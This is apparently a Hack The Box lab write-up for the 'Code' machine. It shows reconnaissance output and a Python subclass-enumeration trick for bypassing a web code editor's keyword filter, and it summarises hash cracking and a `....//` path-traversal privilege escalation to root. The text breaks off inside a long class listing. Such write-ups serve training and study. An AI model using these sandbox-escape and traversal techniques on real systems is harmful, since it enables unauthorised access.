---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - PythonCodeEditor
  - AbstractSyntaxTree
  - AST
  - SecurityCheckBypass
  - sudo
  - jq
  - PathTraversal
---

![](images/Code.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 5000/TCP](#Enumeration-of-Port-5000TCP)
- [Foothold](#Foothold)
    - [Abstract Syntax Tree (AST)](#Abstract-Syntax-Tree-AST)
    - [Subclass Enumeration](#Subclass-Enumeration)
    - [Bypassing Security Checks](#Bypassing-Security-Checks)
    - [Retrieving Passwords from leaked Hashes](#Retrieving-Passwords-from-leaked-Hashes)
- [Enumeration](#Enumeration)
    - [Analysis of backy.sh](#Analysis-of-backysh)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [Path Traversal](#Path-Traversal)
- [user.txt](#usertxt)
- [root.txt](#roottxt)

## Summary

The box is running a `Python Code Editor` on port `5000/TCP` which allows to `run` and `save` code directly in the `browser`. However it has some `security checks` in place which can be `bypassed` after `enumerating` the available `subclasses` to `read files` on `disk`. This also allows to `extract` two `usernames` and `hashes` from the `back-end database` of the application. The `hashes` are already cracked and available on `crackstation.net`. This grants `foothold` on the box. The user `martin` is allowed to run a `script` called `backy.sh` using `sudo`. The purpose of the script is to `backup` the directories `/var/` and `/home/`. The script utilizes `jq` to prevent potential `path traversal` attacks. By modifying the loaded `task.json` with a slightly more advanced `payload` like `....//` it is possible to escape the `/var/` directory and point it directly to `/root/` which results in a `.tar.bz2 archive` containing the `SSH private key`for `root` in order to `escalate privileges`.

## Reconnaissance

### Port Scanning

To begin with we performed the usual `port scan` using `Nmap` and found port `22/TCP` and port `5000/TCP` open. Port `5000/TCP` showed `gunicorn` used as a `web server` which indicated that there was a `website` running on.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.231.240
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 20:01 CET
Nmap scan report for 10.129.231.240
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.17 seconds
```

### Enumeration of Port 5000/TCP

The `website` on port `5000/TCP` was a `Python Code Editor` which allowed to execute and save `Python code`.

- [http://10.129.231.240:5000/](http://10.129.231.240:5000/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.231.240:5000/
http://10.129.231.240:5000/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn/20.0.4], IP[10.129.231.240], JQuery[3.6.0], Script, Title[Python Code Editor]
```

![](images/2025-03-22_20-03_5000_python_code_editor.png)

## Foothold

### Abstract Syntax Tree (AST)

Of course we tried to execute some simple `Python reverse shell` which resulted in the message *“Use of restricted keywords is not allowed.”* by the IDE.

We tried to move our way through the `Abstract Syntax Tree (AST)` to bypass potential `security filters`.

```c
source → tokens → AST → bytecode → execution
```

### Subclass Enumeration

To do so we started with enumerating the available `subclasses`.

```shell
print((1).__class__.__base__.__subclasses__())
```

```shell
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'importlib.abc.ResourceReader'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class '__future__._Feature'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'Struct'>, <class 'unpack_iterator'>, <class 'zipfile.ZipInfo'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'zipfile.Path'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'datetime.date'>, <class 'datetime.timedelta'>, <class 'datetime.time'>, <class 'datetime.tzinfo'>, <class 'pyexpat.xmlparser'>, <class 'plistlib.Data'>, <class 'plistlib.UID'>, <class 'plistlib._PlistParser'>, <class 'plistlib._DumbXMLWriter'>, <class 'plistlib._BinaryPlistParser'>, <class 'plistlib._BinaryPlistWriter'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class '_sha512.sha384'>, <class '_sha512.sha512'>, <class '_random.Random'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class 'ipaddress._IPAddressBase'>, <class 'ipaddress._BaseV4'>, <class 'ipaddress._IPv4Constants'>, <class 'ipaddress._BaseV6'>, <class 'ipaddress._IPv6Constants'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class 'textwrap.TextWrapper'>, <class 'dis.Bytecode'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'pkg_resources.extern.VendorImporter'>, <class 'pkg_resources._vendor.six._LazyDescr'>, <class 'pkg_resources._vendor.six._SixMetaPathImporter'>, <class 'pkg_resources._vendor.six._LazyDescr'>, <class 'pkg_resources._vendor.six._SixMetaPathImporter'>, <class 'pkg_resources._vendor.appdirs.AppDirs'>, <class 'pkg_resources.extern.packaging._structures.Infinity'>, <class 'pkg_resources.extern.packaging._structures.NegativeInfinity'>, <class 'pkg_resources.extern.packaging.version._BaseVersion'>, <class 'pkg_resources.extern.packaging.specifiers.BaseSpecifier'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'pkg_resources._vendor.pyparsing._Constants'>, <class 'pkg_resources._vendor.pyparsing._ParseResultsWithOffset'>, <class 'pkg_resources._vendor.pyparsing.ParseResults'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._FifoCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement'>, <class 'pkg_resources._vendor.pyparsing._NullToken'>, <class 'pkg_resources._vendor.pyparsing.OnlyOnce'>, <class 'pkg_resources._vendor.pyparsing.pyparsing_common'>, <class 'pkg_resources.extern.packaging.markers.Node'>, <class 'pkg_resources.extern.packaging.markers.Marker'>, <class 'pkg_resources.extern.packaging.requirements.Requirement'>, <class 'pkg_resources.IMetadataProvider'>, <class 'pkg_resources.WorkingSet'>, <class 'pkg_resources.Environment'>, <class 'pkg_resources.ResourceManager'>, <class 'pkg_resources.NullProvider'>, <class 'pkg_resources.NoDists'>, <class 'pkg_resources.EntryPoint'>, <class 'pkg_resources.Distribution'>, <class '_ast.AST'>, <class 'ast.NodeVisitor'>, <class 'CArgObject'>, <class '_ctypes.CThunkObject'>, <class '_ctypes._CData'>, <class '_ctypes.CField'>, <class '_ctypes.DictRemover'>, <class '_ctypes.StructParam_Type'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'gunicorn.pidfile.Pidfile'>, <class 'gunicorn.sock.BaseSocket'>, <class 'gunicorn.arbiter.Arbiter'>, <class 'gettext.NullTranslations'>, <class 'argparse._AttributeHolder'>, <class 'argparse.HelpFormatter._Section'>, <class 'argparse.HelpFormatter'>, <class 'argparse.FileType'>, <class 'argparse._ActionsContainer'>, <class 'shlex.shlex'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.Session'>, <class 'ssl.SSLObject'>, <class 'gunicorn.reloader.InotifyReloader'>, <class 'gunicorn.config.Config'>, <class 'gunicorn.config.Setting'>, <class 'gunicorn.debug.Spew'>, <class 'gunicorn.app.base.BaseApplication'>, <class '_pickle.Unpickler'>, <class '_pickle.Pickler'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class '_queue.SimpleQueue'>, <class 'queue.Queue'>, <class 'queue._PySimpleQueue'>, <class 'logging.handlers.QueueListener'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver._NoThreads'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'logging.config.ConvertingMixin'>, <class 'logging.config.BaseConfigurator'>, <class 'gunicorn.glogging.Logger'>, <class 'gunicorn.http.unreader.Unreader'>, <class 'gunicorn.http.body.ChunkedReader'>, <class 'gunicorn.http.body.LengthReader'>, <class 'gunicorn.http.body.EOFReader'>, <class 'gunicorn.http.body.Body'>, <class 'gunicorn.http.message.Message'>, <class 'gunicorn.http.parser.Parser'>, <class 'gunicorn.http.wsgi.FileWrapper'>, <class 'gunicorn.http.wsgi.Response'>, <class 'gunicorn.workers.workertmp.WorkerTmp'>, <class 'gunicorn.workers.base.Worker'>, <class 'typing._Final'>, <class 'typing._Immutable'>, <class 'typing.Generic'>, <class 'typing._TypingEmpty'>, <class 'typing._TypingEllipsis'>, <class 'typing.NamedTuple'>, <class 'typing.io'>, <class 'typing.re'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class 'mimetypes.MimeTypes'>, <class 'werkzeug._internal._Missing'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.datastructures.mixins.ImmutableListMixin'>, <class 'werkzeug.datastructures.mixins.ImmutableDictMixin'>, <class 'werkzeug.datastructures.mixins.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.structures._omd_bucket'>, <class '_hashlib.HASH'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class '_sha3.sha3_224'>, <class '_sha3.sha3_256'>, <class '_sha3.sha3_384'>, <class '_sha3.sha3_512'>, <class '_sha3.shake_128'>, <class '_sha3.shake_256'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'werkzeug.datastructures.auth.Authorization'>, <class 'werkzeug.datastructures.auth.WWWAuthenticate'>, <class 'werkzeug.datastructures.file_storage.FileStorage'>, <class 'werkzeug.datastructures.headers.Headers'>, <class 'werkzeug.datastructures.range.IfRange'>, <class 'werkzeug.datastructures.range.Range'>, <class 'werkzeug.datastructures.range.ContentRange'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 'dataclasses._MISSING_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 'dataclasses._DataclassParams'>, <class 'werkzeug.sansio.multipart.Event'>, <class 'werkzeug.sansio.multipart.MultipartDecoder'>, <class 'werkzeug.sansio.multipart.MultipartEncoder'>, <class 'hmac.HMAC'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.user_agent.UserAgent'>, <class 'werkzeug.sansio.request.Request'>, <class 'werkzeug.sansio.response.Response'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'werkzeug.test.Cookie'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local._ProxyLookup'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'uuid.UUID'>, <class 'flask.json.provider.JSONProvider'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'werkzeug.routing.converters.BaseConverter'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'werkzeug.routing.rules.RulePart'>, <class 'werkzeug.routing.rules.RuleFactory'>, <class 'werkzeug.routing.rules.RuleTemplate'>, <class 'werkzeug.routing.matcher.State'>, <class 'werkzeug.routing.matcher.StateMachineMatcher'>, <class 'werkzeug.routing.map.Map'>, <class 'werkzeug.routing.map.MapAdapter'>, <class '_csv.Dialect'>, <class '_csv.reader'>, <class '_csv.writer'>, <class 'csv.Dialect'>, <class 'csv.DictReader'>, <class 'csv.DictWriter'>, <class 'csv.Sniffer'>, <class 'pathlib._Flavour'>, <class 'pathlib._Accessor'>, <class 'pathlib._Selector'>, <class 'pathlib._TerminatingSelector'>, <class 'pathlib.PurePath'>, <class 'configparser.Interpolation'>, <class 'importlib.metadata.FileHash'>, <class 'importlib.metadata.Distribution'>, <class 'importlib.metadata.DistributionFinder.Context'>, <class 'importlib.metadata.FastPath'>, <class 'importlib.metadata.Prepared'>, <class 'blinker._utilities.Symbol'>, <class 'blinker.base.Signal'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'flask.sansio.scaffold.Scaffold'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous._json._CompactJSON'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'flask.sansio.blueprints.BlueprintSetupState'>, <class 'sqlalchemy.util.preloaded._ModuleRegistry'>, <class '_cython_3_0_10.cython_function_or_method'>, <class '_cython_3_0_10.generator'>, <class 'sqlalchemy.cyextension.collections.IdentitySet'>, <class 'sqlalchemy.cyextension.collections.__pyx_scope_struct__symmetric_difference'>, <class 'sqlalchemy.cyextension.collections.__pyx_scope_struct_1_genexpr'>, <class 'sqlalchemy.cyextension.immutabledict.ReadOnlyContainer'>, <class 'sqlalchemy.cyextension.processors.DecimalResultProcessor'>, <class 'sqlalchemy.cyextension.resultproxy.BaseRow'>, <class 'sqlalchemy.exc.HasDescriptionCode'>, <class 'sqlalchemy.exc.DontWrapMixin'>, <class 'typing_extensions._Sentinel'>, typing_extensions.Any, <class 'typing_extensions.TypedDict'>, <class 'typing_extensions.Annotated'>, <class 'typing_extensions.NoDefaultType'>, <class 'typing_extensions._DefaultMixin'>, <class 'typing_extensions.TypeVar'>, <class 'typing_extensions._Immutable'>, <class 'typing_extensions.deprecated'>, <class 'typing_extensions.NamedTuple'>, <class 'typing_extensions.NewType'>, <class 'typing_extensions.TypeAliasType'>, <class 'typing_extensions.Doc'>, <class 'concurrent.futures._base._Waiter'>, <class 'concurrent.futures._base._AcquireFutures'>, <class 'concurrent.futures._base.Future'>, <class 'concurrent.futures._base.Executor'>, <class 'asyncio.coroutines.CoroWrapper'>, <class 'asyncio.events.Handle'>, <class 'asyncio.events.AbstractServer'>, <class 'asyncio.events.AbstractEventLoop'>, <class 'asyncio.events.AbstractEventLoopPolicy'>, <class '_asyncio.Future'>, <class '_asyncio.FutureIter'>, <class 'TaskStepMethWrapper'>, <class 'TaskWakeupMethWrapper'>, <class '_RunningLoopHolder'>, <class 'asyncio.futures.Future'>, <class 'asyncio.protocols.BaseProtocol'>, <class 'asyncio.transports.BaseTransport'>, <class 'asyncio.sslproto._SSLPipe'>, <class 'asyncio.locks._ContextManager'>, <class 'asyncio.locks._ContextManagerMixin'>, <class 'asyncio.locks.Event'>, <class 'asyncio.trsock.TransportSocket'>, <class 'asyncio.queues.Queue'>, <class 'asyncio.streams.StreamWriter'>, <class 'asyncio.streams.StreamReader'>, <class 'asyncio.subprocess.Process'>, <class 'asyncio.unix_events.AbstractChildWatcher'>, <class 'greenlet.greenlet'>, <class 'sqlalchemy.util.langhelpers.safe_reraise'>, <class 'sqlalchemy.util.langhelpers.PluginLoader'>, <class 'sqlalchemy.util.langhelpers.portable_instancemethod'>, <class 'sqlalchemy.util.langhelpers.HasMemoized'>, <class 'sqlalchemy.util.langhelpers.MemoizedSlots'>, <class 'sqlalchemy.util.langhelpers._FastIntFlag'>, <class 'sqlalchemy.util.langhelpers.TypingOnly'>, <class 'sqlalchemy.util.langhelpers.EnsureKWArg'>, <class 'sqlalchemy.util._concurrency_py3k.AsyncAdaptedLock'>, <class 'sqlalchemy.util._concurrency_py3k._Runner'>, <class 'sqlalchemy.util.concurrency._AsyncUtil'>, <class 'sqlalchemy.event.registry.EventTarget'>, <class 'sqlalchemy.event.base._UnpickleDispatch'>, <class 'sqlalchemy.log.Identified'>, <class 'sqlalchemy.log.InstanceLogger'>, <class 'sqlalchemy.log.echo_property'>, <class 'sqlalchemy.pool.base.PoolResetState'>, <class 'sqlalchemy.pool.base._ConnDialect'>, <class 'sqlalchemy.pool.base.ManagesConnection'>, <class 'sqlalchemy.sql.roles.SQLRole'>, <class 'sqlalchemy.sql.roles.UsesInspection'>, <class 'sqlalchemy.sql.roles.AllowsLambdaRole'>, <class 'sqlalchemy.sql.visitors.Visitable'>, <class 'sqlalchemy.sql.visitors.HasTraverseInternals'>, <class 'sqlalchemy.sql.visitors.HasTraversalDispatch'>, <class 'sqlalchemy.sql.cache_key.HasCacheKey'>, <class 'sqlalchemy.sql.operators.Operators'>, <class 'sqlalchemy.sql.base.Immutable'>, <class 'sqlalchemy.sql.base.DialectKWArgs'>, <class 'sqlalchemy.sql.base.CompileState'>, <class 'sqlalchemy.sql.base.Options'>, <class 'sqlalchemy.sql.coercions.RoleImpl'>, <class 'sqlalchemy.sql.coercions._Deannotate'>, <class 'sqlalchemy.sql.coercions._StringOnly'>, <class 'sqlalchemy.sql.type_api.TypeEngineMixin'>, <class 'sqlalchemy.sql.sqltypes._RenderISO8601NoT'>, <class 'sqlalchemy.sql.selectable.HasPrefixes'>, <class 'sqlalchemy.sql.selectable.HasSuffixes'>, <class 'sqlalchemy.sql.selectable.HasHints'>, <class 'sqlalchemy.sql.selectable.NoInit'>, <class 'sqlalchemy.sql.selectable._SelectFromElements'>, <class 'sqlalchemy.sql.schema.HasConditionalDDL'>, <class 'sqlalchemy.sql.schema.IdentityOptions'>, <class 'sqlalchemy.sql.schema.ColumnCollectionMixin'>, <class 'sqlalchemy.sql.util._repr_base'>, <class 'sqlalchemy.sql.util.ColumnAdapter._IncludeExcludeMapping'>, <class 'sqlalchemy.sql.dml.DMLWhereBase'>, <class 'sqlalchemy.sql.functions._FunctionGenerator'>, <class 'sqlalchemy.sql.compiler.Compiled'>, <class 'sqlalchemy.sql.compiler.IdentifierPreparer'>, <class 'sqlalchemy.sql.lambdas.AnalyzedCode'>, <class 'sqlalchemy.sql.lambdas.NonAnalyzedFunction'>, <class 'sqlalchemy.sql.lambdas.AnalyzedFunction'>, <class 'sqlalchemy.sql.naming.ConventionDict'>, <class 'sqlalchemy.engine.interfaces.CreateEnginePlugin'>, <class 'sqlalchemy.engine.interfaces.ExecutionContext'>, <class 'sqlalchemy.engine.interfaces.ExceptionContext'>, <class 'sqlalchemy.engine.interfaces.AdaptedConnection'>, <class 'sqlalchemy.engine.util.TransactionalContext'>, <class 'sqlalchemy.engine.mock.MockConnection'>, <class 'sqlalchemy.engine.result.ResultMetaData'>, <class 'sqlalchemy.engine.result._WithKeys'>, <class 'sqlalchemy.engine.cursor.ResultFetchStrategy'>, <class 'sqlalchemy.engine.reflection.ReflectionDefaults'>, <class 'sqlalchemy.engine.reflection._ReflectionInfo'>, <class 'sqlalchemy.orm.base.InspectionAttr'>, <class 'sqlalchemy.orm.collections.collection'>, <class 'sqlalchemy.orm.collections.CollectionAdapter'>, <class 'sqlalchemy.orm.mapped_collection._AttrGetter'>, <class 'sqlalchemy.orm.interfaces._IntrospectsAnnotations'>, <class 'sqlalchemy.orm.interfaces._DCAttributeOptions'>, <class 'sqlalchemy.orm.interfaces.LoaderStrategy'>, <class 'sqlalchemy.orm.attributes.AttributeEventToken'>, <class 'sqlalchemy.orm.attributes.AttributeImpl'>, <class 'sqlalchemy.orm.attributes.HasCollectionAdapter'>, <class 'sqlalchemy.orm.util._WrapUserEntity'>, <class 'sqlalchemy.orm.state.AttributeState'>, <class 'sqlalchemy.orm.state.PendingCollection'>, <class 'sqlalchemy.orm.instrumentation._SerializeManager'>, <class 'sqlalchemy.orm.context.QueryContext'>, <class 'sqlalchemy.orm.context.DMLReturningColFilter'>, <class 'sqlalchemy.orm.context._QueryEntity'>, <class 'sqlalchemy.orm.loading.PostLoad'>, <class 